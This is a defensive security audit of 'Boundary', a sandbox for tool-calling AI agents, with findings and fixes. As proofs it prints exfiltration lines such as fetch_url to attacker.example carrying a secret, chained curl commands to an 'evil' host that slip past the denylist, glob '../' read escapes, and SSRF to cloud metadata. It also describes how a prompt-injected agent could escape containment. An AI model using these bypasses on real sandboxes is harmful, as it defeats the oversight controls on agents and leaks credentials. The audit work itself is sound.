# Boundary — Security Audit

**Date:** 2026-07-02
**Scope:** `boundary/` package at commit `7482d1e` (the enforcement engine, tool
surface, sandbox drivers, and schedulers). Docs, examples, and tests reviewed
for context but not audited for their own defects.
**Method:** Manual source review of every security-relevant module, plus small
runnable proofs for the path, glob, and command-classification findings.

## What Boundary is trying to guarantee

Boundary runs a tool-calling agent inside an "envelope" and claims four
enforceable boundaries:

1. **Read/Write-jail** — file access is confined to the workspace, and writes
   land only in the declared `writable_paths`.
2. **Egress containment** — network egress is bounded to an allowlist (the `srt`
   driver's headline feature).
3. **No unapproved irreversible actions** — "commit-class" side effects
   (push/send/post) are refused unless explicitly allowed.
4. **Taint / exfil awareness** — once a run touches untrusted content, flows to
   writable sinks are gated.

The findings below are organized by how much each erodes one of these
guarantees. Two of them chain into a complete **read-any-file → exfiltrate**
path that the sandbox is specifically sold as preventing: F1 lets the agent read
any file on the host through the workspace read tools (no bash, no symlink), and
F4 lets it send the bytes out even under the strongest `srt` posture. Reads
being effectively unrestricted (F1, F6) means the whole model rests on egress
containment — and egress containment has holes (F4, F5, F7).

---

## Findings

**Remediation status:** F1/F4 fixed in #21; F2/F3/F11 in #22; F5 in #23; F6/F7
via opt-in controls in #24; F8–F10 hardened in the lows batch. Every finding
except F12 (informational — inherent prompt injection) is now addressed.

| ID | Severity | Status | Title | Guarantee eroded |
|----|----------|--------|-------|------------------|
| F1 | **Critical** | ✅ fixed (#21) | `grep`/`glob`/`count_matches` escape the read-jail via `../` in the glob (and via planted symlinks) | Read-jail |
| F4 | **High** | ✅ fixed (#21) | `fetch_url` bypasses the srt egress allowlist entirely | Egress containment |
| F5 | **High** | ✅ fixed | `fetch_url` SSRF: no scheme/host validation, follows redirects | Egress containment |
| F2 | **High** | ✅ fixed (P1) | `writable_paths` allowlist is far looser than declared (`*` spans `/`, `..` not neutralized) | Write-jail scope |
| F3 | **Medium** | ✅ fixed (P1) | Envelope write-gate dispatches on tool *name*, not *kind* — latent bypass | Write-jail |
| F7 | **Medium** | ✅ opt-in | Commit-class bash denylist is trivially bypassable | No unapproved actions |
| F6 | **Medium** | ✅ opt-in | No general read boundary for bash; on-disk secrets are in scope | (amplifier) |
| F8 | **Low** | ✅ fixed | TOCTOU between `Workspace.resolve()` and the actual open | Read/Write-jail |
| F9 | **Low** | ✅ fixed | Windows scheduler builds a `cmd /c` string with interpolated, unvalidated values | Local integrity |
| F10 | **Low** | ✅ fixed | Headless run-lock has a TOCTOU race / PID-reuse steal | Concurrency safety |
| F11 | **Low** | ✅ fixed (P1) | `path_allowed` uses case-folding `fnmatch`, widening the allowlist on macOS/Windows | Write-jail scope |
| F12 | **Info** | — | Untrusted content (web + discover sources) steers the agent (prompt injection) | Taint awareness |

**Correctly done (don't regress these):** `Workspace.resolve()` uses full
symlink resolution (`.resolve()`) + component-wise `relative_to()`, so
`read_file`/`write_file`/`edit_file`/`append_file`/`list_dir` are properly
traversal- and symlink-safe, and there is no `/workspace-evil` sibling-prefix
bug. `yaml.safe_load` (no unsafe deserialization). launchd uses `plistlib` +
list-argv `subprocess` (no injection). Seatbelt profile rule ordering is correct
(last-match-wins). The taint ledger lives outside the workspace with bash's
`HOME` repointed, so the jailed agent can't read or clear it. Failed writes
don't consume the write budget. Copilot OAuth token file permissions are
validated before use.

---

### F1 — `grep`/`glob`/`count_matches` escape the read-jail via the glob pattern (Critical)

`boundary/tools/fs.py`: `grep` (~line 157), `count_matches` (~line 198), and
`glob_files` (~line 132) feed the **agent-controlled glob string straight into
`workspace.root.glob(pattern)`** and then `read_text()`/`read_bytes()` the
results. Unlike `read_file`/`list_dir`, they never call `workspace.resolve()`,
and `pathlib` accepts `..` in glob patterns, so the pattern walks out of the
workspace. Proven against a scratch workspace:

```
grep(pattern="API_KEY", glob="../*")
  -> ../outside_secret.txt:1:API_KEY=sk-leak-secret     # full contents leaked
glob(pattern="../*")
  -> ../outside_secret.txt                              # paths leaked
read_file(path="../outside_secret.txt")
  -> PermissionError: escapes workspace                 # control: correctly blocked
```

`grep` leaks full file contents, `glob` leaks paths, `count_matches` leaks
existence/counts. `glob="../../../../etc/*"` walks to anywhere the invoking user
can read. This is a no-privilege, no-bash, no-symlink arbitrary-file read that
defeats the read boundary for the typed fs tools entirely — and it chains
directly with F4 (`fetch_url` exfil) into full read-any-file-then-exfiltrate.

A planted symlink is a second vector on the same three tools: a link created
inside the workspace (`ln -s /etc escape`, an in-jail write) is followed by
single-level globs — `glob("escape/*")` yields `escape/passwd`. (`read_file`'s
`resolve()` already blocks this; the bulk tools bypass it.)

**Fix:** Route every glob result through the containment check — `resolve()` each
match and drop any whose resolved path is not `relative_to(self.root)` — rather
than trusting the pattern. Also reject patterns containing `..` or absolute
components up front. Apply to all three tools.

---

### F4 — `fetch_url` bypasses the srt egress allowlist (High)

`boundary/tools/web.py` performs `httpx.get(url, ...)` **in the Boundary
process**. `srt` only wraps the `bash` subprocess
(`sandbox.py::_run_srt`), so it has no visibility into network I/O from the
web tool. `register_web_tools()` is not even handed the allowlist —
`agent.py:66` calls `register_web_tools(self.tools)` with no `egress_allowlist`.

Consequence: the strongest posture the tool offers — `--sandbox-driver srt
--egress-allow trusted.example.com` — still allows

```
fetch_url("http://attacker.example/collect?d=<secret>", reason="...")
```

to any host. The "OS-enforced egress allowlist over the whole process tree" does
**not** cover the process's own outbound HTTP. The taint system only notices
after the fact and only as a warning: `envelope.py:599` records a `taint_egress`
event when an *already-tainted* run fetches an off-allowlist host, but it never
blocks, the first tainted fetch is free, and `egress_allowlist` is used there
only for the comparison string — nothing enforces it on the wire.

**Fix:** Enforce the egress allowlist in-process for every network tool
(host-check before the request); fail closed when an allowlist/`srt` is
configured. Longer term, route web fetches through the same sandbox boundary or
a vetted forward proxy so there is one egress choke point, not two.

---

### F5 — `fetch_url` SSRF (High)

`fetch_url` passes the model-supplied URL straight to `httpx.get(url,
follow_redirects=True, ...)` with no scheme allowlist, no host/IP validation, and
redirect-following on. Combined with unrestricted reads, this is a strong
internal-recon + exfil primitive: `http://169.254.169.254/latest/meta-data/...`
(cloud metadata / IAM creds), `http://127.0.0.1:<port>/...` (loopback admin
services), and arbitrary internal hosts are reachable, and an allowlisted host
can 302 you off-allowlist.

**Fix:** Restrict scheme to `http`/`https`; resolve the hostname and reject
loopback, link-local (`169.254.0.0/16`, `fe80::/10`), and RFC-1918 / ULA ranges
unless explicitly allowlisted; re-validate on **every** redirect hop (or disable
redirect-following). Apply the same block to `workiq`/any future network tool.

---

### F2 — `writable_paths` allowlist is far looser than declared (High)

`Envelope.path_allowed` (`boundary/envelope.py`) matches the raw path string
with `fnmatch`, whose `*` does **not** stop at `/` and which does not neutralize
`..`, while the actual write uses `workspace.resolve(path)`. Proven:

```
writable_paths = ["reports/*.md"]
  path_allowed("reports/weekly.md")            -> True   (intended)
  path_allowed("reports/a/b/c/deep.md")        -> True   (NOT intended)
  path_allowed("reports/../secrets/creds.md")  -> True   (NOT intended)
writable_paths = ["*.md"]
  path_allowed("a/b/c.md")                     -> True   (any .md anywhere)
```

A declared narrow scope like `reports/*.md` actually authorizes writes to
arbitrary nested paths and to anything reachable via `..`. `Workspace.resolve`
still contains the destination to inside the workspace root (so this is a
scope-escape *within* the workspace, not a filesystem escape) — but it defeats
the purpose of a tight `writable_paths`, and under `--sandbox-driver none` bash
writes have no jail at all, making the loose allowlist the only line. A symlink
under an allowed glob dir gives the same escape.

**Fix:** Compute the workspace-relative *resolved* path first
(`workspace.resolve(path).relative_to(root)`, reject residual `..`), then match
that normalized POSIX string with segment-aware semantics (`PurePosixPath.match`
or explicit `**`), not `fnmatch` where `*` crosses `/`. Keep deny-by-default
(empty list ⇒ no writes), which is already correct.

---

### F3 — Envelope write-gate dispatches on tool *name*, not *kind* (Medium)

`envelope.py:428` gates writes with `if base.kind == "write" and base.name in
("write_file", "edit_file")`, with parallel name checks for `append_file` and
`bash`. Any *future* `kind="write"` tool whose name isn't one of those falls
through every specific branch to the default path (~line 606) and executes with
**no `path_allowed` check, no `max_writes`, no taint gate** — only the workspace
jail applies. The three current write tools are covered, but this is fragile and
silently-failing for a security gate: adding a `patch_file`/`move_file` tool
later opens an unbounded write hole with no error.

**Fix:** Dispatch the write/commit accounting and `path_allowed` gate on
`base.kind`, and fail closed for any unrecognized write/commit tool rather than
letting it reach the unchecked default path.

---

### F7 — Commit-class bash denylist is trivially bypassable (Medium)

`_bash_command_is_commit` (`boundary/envelope.py`) inspects only the **first
token** (after stripping `FOO=bar` prefixes) against an 8-entry basename
denylist. Proven bypasses:

```
curl http://evil/x                     -> BLOCKED
bash -c "curl http://evil"             -> allowed
true; curl http://evil                 -> allowed
echo hi | curl http://evil             -> allowed
env curl http://evil                   -> allowed
python3 -c "import os;os.system(...)"  -> allowed
git status && git push                 -> allowed
(curl http://evil)                     -> allowed
```

Any chaining (`;`/`|`/`&&`), interpreter (`bash -c`, `python -c`), `env`, or
subshell defeats it. The module's comments acknowledge it's coarse — acceptable
*if* a real OS egress boundary sits behind it. But on every driver except `srt`
(`seatbelt`, `none`, and `auto`→`seatbelt` on macOS) there is no egress
containment, so this denylist is the *only* barrier to irreversible/exfil bash,
and it stops only the most literal invocation. (The taint-on-non-srt-bash
mechanism gates tainted → *workspace-write*, not the outbound bash egress
itself.)

**Fix:** Treat the denylist as a UX nudge, never a control. Make the network
guarantee rest on OS enforcement: require `srt` (fail closed) for any run
combining bash + network, and rely on the egress allowlist + typed `bash_commit`
gating for irreversibility. Document that under `seatbelt`/`none`, bash egress is
uncontained regardless of the denylist.

---

### F6 — No general read boundary for bash; on-disk secrets are in scope (Medium, by-design amplifier)

seatbelt is `(allow default)` + `(deny file-write*)`; `srt` uses `allowRead:
["/"]`; `_jail_env` repoints `HOME` but absolute paths (`~/.aws/credentials`,
`~/.config/gh/hosts.yml`, `~/.ssh/*`, `/etc/*`) remain readable by bash. The
workspace *file* tools are jailed (modulo F1); bash is not. This is a stated
design choice, but it is load-bearing — it collapses the entire safety of a run
onto egress containment, which F4/F5/F7 show is incomplete.

**Fix:** Offer an optional read-jail for sensitive runs (under `srt`, `denyRead`
well-known secret paths, or scope `allowRead` to workspace + explicit
allowlist). At minimum, document that any secret readable by the invoking user
is inside the trust boundary, so operators run Boundary as a dedicated
low-privilege principal.

---

### F8 — TOCTOU between resolve and open (Low)

`Workspace.resolve()` returns a realpath and the caller re-opens it
(`write_text`/`open("a")`/`read_bytes`), re-traversing the path. A concurrent
process — sandboxed bash runs as a child while the parent holds the tools, and
the code explicitly supports batch/best-of-K concurrency — can swap an
intermediate component to a symlink between the check and the open. Timing is
hard but not impossible.

**Fix:** Open the already-resolved final path with `O_NOFOLLOW` (or
`openat`-style), so a swapped component fails rather than escapes.

---

### F9 — Windows scheduler builds an unvalidated `cmd /c` string (Low)

`win_scheduler._build_action` composes an inline
`cmd /c ""<bin>" <command> "<config_path>" >> ... 2>> ..."` string,
interpolating `config_path` and `label` (from the schedule `name`) into nested
double-quotes for the schtasks `/tr` action. A `name` or path containing `"`,
`&`, `^`, or `%` can break the quoting and inject. Low exploitability (installing
a schedule is a local privileged action), but a shared/committed schedule YAML
is a plausible vector.

**Fix:** Validate `name` against `[A-Za-z0-9._-]` and reject shell
metacharacters in any interpolated value; prefer writing a wrapper script and
pointing `/tr` at it rather than an inline metacharacter-laden command.

---

### F10 — Headless run-lock TOCTOU / PID-reuse steal (Low)

`headless._acquire_lock` checks `lock_path.exists()` then `write_text`s the PID —
non-atomic, so two concurrent starts can both run. Stale-lock stealing trusts a
bare PID (`os.kill(pid, 0)`), which can match an unrelated reused PID. For a
commit-enabled schedule, double-firing has real side effects.

**Fix:** Create the lock atomically with `O_CREAT | O_EXCL`; store PID **and**
process start-time (or boot-id) and require both to match before stealing.

---

### F11 — `path_allowed` case-folding widens the allowlist (Low)

`path_allowed` uses `fnmatch.fnmatch`, which case-normalizes per-OS. On
case-insensitive filesystems (macOS/Windows) the allowlist matches paths of
differing case — a mild widening.

**Fix:** Use `fnmatchcase` (or the F2 segment-aware matcher) on a normalized
relative path.

---

### F12 — Untrusted content steers the agent (Informational)

`fetch_url` output and the `discover`/`fabricspecs` sources prepended into the
task prompt (`headless.py`) are untrusted text that flows into the model and can
steer subsequent tool calls (prompt injection). The taint ledger tracks the
*data flow* to writable sinks but does nothing about *instruction* injection —
inherent to tool-using agents, noted so it is tracked. The taint gate
(`on_taint=refuse`) is the right primitive; pair it with the F1/F4/F5/F7 fixes so
a hijacked agent cannot reach files or the network even if convinced to.

---

## Remediation plan (priority order)

**P0 — close the read/exfil chain (F1, F4, F5).** These are the complete
read-any-file → exfiltrate path the sandbox claims to prevent.
1. F1: containment-check every glob result in `grep`/`glob`/`count_matches`
   (resolve + `relative_to`), and reject `..`/absolute patterns.
2. F4: enforce the egress allowlist in-process for `fetch_url`; fail closed under
   `srt`/allowlist.
3. F5: SSRF defenses — scheme allowlist, private/loopback/link-local blocking,
   redirect re-validation.
4. Add regression fixtures: `grep glob="../*"` must find nothing; a web-enabled
   `srt` run must not reach an off-allowlist host.

**P1 — tighten the write-jail (F2, F3).** Match `writable_paths` against the
resolved workspace-relative path with segment-aware globbing (reject residual
`..`); dispatch the write gate on `kind` and fail closed for unknown write tools.
Fixtures for `reports/../x`, `reports/a/b/c`, bare `*.md`, and a synthetic
`kind="write"` tool.

**P2 — reframe the commit denylist (F7) and offer a read-jail (F6).** Require
`srt` (fail closed) for bash + network; document `seatbelt`/`none` egress
reality; add an optional `denyRead` secret-path list for `srt`.

**P3 — harden the periphery (F8–F11).** `O_NOFOLLOW` opens; validate scheduler
`name`/paths and drop inline `cmd /c`; atomic PID-reuse-safe run-lock;
`fnmatchcase`.

**Cross-cutting:** The Third Umpire already surfaces `taint_egress`,
`egress_uncontained`, and `bash_egress_denylist` *post-hoc* — good for detection,
but detection is not prevention. Every finding here is a case where a check
should become a **block**: wire the P0/P1 fixes as pre-execution refusals in the
tool layer and `_make_enforced_tool`, not as verdict-time observations.

---

# Delta audit — 2026-07-29

**Scope:** the surface added *after* the 2026-07-02 audit's commit `7482d1e`,
i.e. the MCP tool-inversion stack from PRs #47/#48 — `boundary/mcp_gateway.py`
(gateway core, HTTP transport, bearer auth), `boundary/launcher.py` (`boundary
launch` jailed-caller launcher), and the `mcp-serve`/`launch` CLI wiring. The
engine core audited at `7482d1e` was **not** re-audited: the gateway reuses the
exact `_make_enforced_tool` object, so its per-tool gates (path/glob
containment, `writable_paths` matching, egress checks) cannot drift by
construction.

**Method:** manual source review fanned across three reviewers by surface, every
candidate finding verified at the lead tier — two by runnable proof (F14, F16),
the rest by source trace. `srt` is not installed in this environment, so the
launcher's *runtime* jail behavior (denyWrite/denyRead/egress enforcement) is
verified only against the settings-JSON shape, not against real `srt` — called
out as F21 (testing gap).

**Headline:** no finding reopens a **critical** guarantee from the first audit
(read-jail, write-jail, egress, commit-refuse all hold on the MCP surface). The
serious findings are (1) the launcher hiding secret *files* but not secret
*environment variables*, and (2) a token-capture/impersonation race on the
gateway port. Everything else is defense-in-depth, info-leak, or a
long-lived-session weakening of the staging pivot.

| ID | Severity | Status | Title | Guarantee eroded |
|----|----------|--------|-------|------------------|
| F13 | **High** | open | `boundary launch` passes the parent env unfiltered — secret env vars reach the jailed caller; only secret *files* are hidden | Read-jail (secrets) |
| F14 | **Medium** | open | Port TOCTOU: `pick_free_port()` releases the port before the gateway binds → a co-resident process can impersonate the gateway, capture the token, and write the workspace unsandboxed | Involuntary containment |
| F15 | **Medium** | open | Staging pivot fires once per gateway *process*, not per task — a long-lived session stages once, then every later task is exempt | Staging discipline |
| F16 | **Medium** | open | Loopback egress allowlist is port-unscoped — the jailed caller can reach any local service, not just the gateway | Egress containment |
| F17 | **Low** | open | Scratch dir holding the bearer token + srt settings is never cleaned up | Secret hygiene |
| F18 | **Low** | open | `{MCP_TOKEN}` argv substitution puts the token in `ps`/`/proc/<pid>/cmdline` | Secret hygiene |
| F19 | **Low** | open | Path-escape `PermissionError` leaks the absolute workspace root to the caller (proven) | Info leak |
| F20 | **Low** | open | No warning when `mcp-serve --host` is widened off loopback (asymmetric with `--no-auth`) | Operator safety |
| F21 | **Low** | open | Non-`http` ASGI scopes bypass the bearer gate (latent — upstream mcp routing blocks it today) | Auth (defense-in-depth) |
| F22 | **Low** | open | `gateway_argv()` doesn't forward `--egress-allow`/`--deny-read`/`--sandbox-driver`/`--require-srt-for-bash` — the gateway's own `--shell` bash tool runs under `mcp-serve` defaults | Config drift |
| F23 | **Low** | open | Gateway surface has no wall-clock / repeat-call / iteration halt (engine has all three) | Defense-in-depth |
| F24 | **Info** | — | `boundary_status` discloses the absolute workspace path to the caller | Info leak |
| F25 | **Info** | — | Third Umpire's ambiguity/claim-label checks read vacuously clean on gateway transcripts (no assistant turns to scan) | Grading fidelity |
| F26 | **Info** | — | Launcher jail correctness is tested against settings *shape* only, never against real `srt` | Test coverage |

**Correctly done (don't regress):** `caller_srt_settings()` resolves
`workspace_root` with `.resolve()` before denying it (symlinked `--workspace`
still denied); `default_deny_read()` protects the **real** HOME, not the
repointed scratch HOME (`caller_env()` returns a fresh dict and never mutates
`os.environ`, verified independently by two reviewers); the gateway host is
hard-pinned to loopback in `gateway_argv()` and `launch` exposes no `--host`;
the token reaches the gateway subprocess via env, never argv; `make_token()` is
`secrets.token_urlsafe(32)` (~256 bits); bearer compare is `hmac.compare_digest`
(constant-time), empty-token opt-out requires the explicit `--no-auth` flag and
is not reachable via an empty env var; `--no-auth` and missing-`srt` both fail
loud, never silently downgrade; both subprocess spawns use list-argv (no shell
injection); the gateway's session counters (writes/appends/external/taint)
persist across the whole session (no per-call reset) and taint only ever grows
more conservative.

## F13 — `boundary launch` passes the parent environment unfiltered (High)

`boundary/launcher.py:126` — `caller_env()` does `env = dict(base)` (base =
`os.environ` of the `launch` process) and overrides only `HOME`, temp/XDG, and
`BOUNDARY_MCP_*`. Every other inherited variable passes through. The launcher's
selling point is hiding on-disk secrets via `default_deny_read()`
(`~/.aws`, `~/.ssh`, `~/.netrc`, …) — but that is a **file-path** denylist, and
srt's `denyRead` cannot hide environment variables from a process it `exec`s.
So `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `OPENAI_API_KEY`, `DATABASE_URL`,
etc. — exactly the credentials a dev/CI shell exports, and where most secrets
actually live — are readable by the jailed (possibly prompt-injected) caller via
`os.environ`, then exfiltratable over the intentionally-allowed egress or a
scratch write. This is the same *class* of gap as the file denylist F13 closes,
one channel over. **Fix:** switch `caller_env()` to an additive allowlist
(PATH, locale, the repointed HOME/temp/XDG, `BOUNDARY_MCP_*`) and require
operators to re-admit anything else, or at minimum strip credential-shaped names
(`*_TOKEN`/`*_KEY`/`*_SECRET`/`AWS_*`/…) with a warning.

## F14 — Port TOCTOU enables gateway impersonation + token capture (Medium)

`boundary/launcher.py:48-53,186,191,56-64` — `pick_free_port()` binds a socket,
**closes it**, and returns the bare port number; the gateway is `Popen`'d
afterward and must cold-start a Python interpreter before it rebinds that port.
`wait_ready()` only does a bare `socket.create_connection` — no token handshake,
no identity check. In the window, a co-resident process (a second concurrent
`launch`, or an adversary on a shared host) can bind `127.0.0.1:<port>` first;
`wait_ready` accepts the impostor, the caller sends its `Authorization: Bearer
<token>` to it, and the impostor — an ordinary **unsandboxed** process — can both
capture the token and service write requests against the real workspace with no
envelope at all, defeating involuntary containment for that run. Environment-
dependent (needs a racing local process). **Fix:** pass the already-bound socket
fd into the gateway (socket activation), or have the gateway bind `:0` and report
the bound port back over a pipe, or make `wait_ready` an authenticated check.

## F15 — Staging pivot is per-process, not per-task (Medium, proven)

`boundary/mcp_gateway.py:94` creates `self._counters` once; `stage_proposal`
(`envelope.py:879`) sets `counters["staged"]=1` permanently. `EnvelopeRunner`
rebuilds fresh counters every `.run()` (`envelope.py:985`), so each engine task
re-requires staging; the gateway session does not. **Proven:** after one
`stage_proposal`, a simulated second task issued 2 unstaged reads
(`max_unstaged_reads=1`) and a write with no re-stage — all allowed. A
long-lived server pointed at an agent across many requests satisfies staging
once, then every later request (including an injected one) skips the pivot.
**Fix:** key staging state per logical task (a `begin_task`/reset tool or a
caller-supplied task id), not per process.

## F16 — Loopback egress allowlist is port-unscoped (Medium)

`boundary/launcher.py:44,83` — `LOOPBACK_DOMAINS = ["localhost","127.0.0.1"]`
goes into the caller's `allowedDomains` with no port. If srt matches on hostname
(plausible for a proxy-style allowlist; unverifiable without srt here), the
caller reaches **every** loopback service — other dev servers, admin UIs, other
`launch` gateways, cloud-SDK OAuth callback listeners — a real pivot/exfil
channel the write-jail doesn't touch. **Fix:** scope to `127.0.0.1:<gateway
port>` if srt supports host:port entries; otherwise document the residual risk
and consider a Unix-domain-socket transport.

## F17–F24 (summary)

- **F17** `launcher.py:224-229` — the `finally` only stops the gateway; the
  `mkdtemp` scratch dir (holding `mcp.json` with the token and `srt-settings.json`
  exposing the workspace + deny-read list) is never removed. `0700` perms and a
  single-use token cap the damage; still unbounded on-disk secret accumulation.
  **Fix:** `shutil.rmtree(scratch, ignore_errors=True)` in the `finally`.
- **F18** `launcher.py:95-102,206` — `{MCP_TOKEN}` argv substitution lands the
  token in `ps`/`/proc/<pid>/cmdline` (world-readable, unlike `/proc/*/environ`).
  Redundant with `BOUNDARY_MCP_TOKEN` (env) and `{MCP_CONFIG}` (a `0700` file).
  **Fix:** drop it or warn loudly when a caller template uses it.
- **F19** `tools/workspace.py:21-26` → `mcp_gateway.py` exception handler —
  `read_file("/etc/passwd")` returns `ERROR: PermissionError: path /etc/passwd
  escapes workspace <ABS ROOT>`, leaking the absolute workspace root and username
  (**proven**). **Fix:** catch `PermissionError` in the fs tools, return a
  relative-only message.
- **F20** `cli.py` (`mcp-serve`) — `--no-auth` warns loudly but widening `--host`
  off loopback is silent. **Fix:** warn when `host not in (127.0.0.1, localhost,
  ::1)`.
- **F21** `mcp_gateway.py:317` — `BearerAuthASGI` gates only `scope["type"] ==
  "http"`; other scopes fall through unauthenticated. Not exploitable today
  (mcp mounts `/mcp` as an http-only `Route` + a DNS-rebind middleware), so it's
  latent. **Fix (fail closed):** authenticate everything except `"lifespan"`.
- **F22** `launcher.py:140-162` — `gateway_argv()` omits `--egress-allow`,
  `--deny-read`, `--sandbox-driver`, `--require-srt-for-bash`, so with `--shell`
  the gateway's own bash tool runs under `mcp-serve` defaults (empty egress is
  fail-safe; the operator's flags silently don't apply). **Fix:** forward them.
- **F23** `mcp_gateway.py` — the gateway surface has no wall-clock, no repeat-call
  halt, no iteration cap (the engine has all three). By design for token spend
  (the caller spends in its own process), but wall-clock is the gateway's own
  time and could bound a runaway session. **Fix:** an optional session deadline +
  repeat-call halt.
- **F24** `mcp_gateway.py:160` — `boundary_status` returns the absolute workspace
  path to the caller. Minor info leak.

## Suggested remediation order

1. **F13** (env allowlist) and **F17** (rmtree scratch) — cheap, and F13 is the
   only High. Do first.
2. **F19/F20/F21** — small, clearly-correct hardening (catch `PermissionError`,
   host-widen warning, fail-closed scope gate).
3. **F15** (per-task staging reset) and **F18/F22/F24** — need a small API/UX
   decision or flag plumbing.
4. **F14** (port TOCTOU) and **F16** (egress scoping) — the robust fixes touch
   the launcher's process/transport model and, for F16, depend on srt's
   host:port support; schedule with the first real `srt` integration test (F26).
